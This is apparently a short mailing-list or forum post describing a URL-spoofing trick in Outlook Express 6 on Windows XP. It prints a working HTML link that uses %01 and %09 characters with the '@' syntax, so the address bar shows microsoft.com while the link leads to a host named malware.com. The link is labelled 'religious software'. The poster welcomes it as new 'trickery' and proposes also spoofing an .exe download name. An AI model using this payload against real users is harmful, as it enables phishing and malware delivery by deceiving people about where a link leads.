The following works on Outlook Express 6 latest everything. Running 
on XP.

09% pushes malware.com out of sight in the task bar, and %01 leaves 
microsoft.com intact in the address bar:

<A 
href="http://www.microsoft.com%01%09%09%09%09%09%09%
09@....malware.com">religious 
software</A>

Certainly will add a new flavour to the ever increasing methods of 
trickery. Now all we need to do is spoof the file download name on 
an *.exe and away we go.
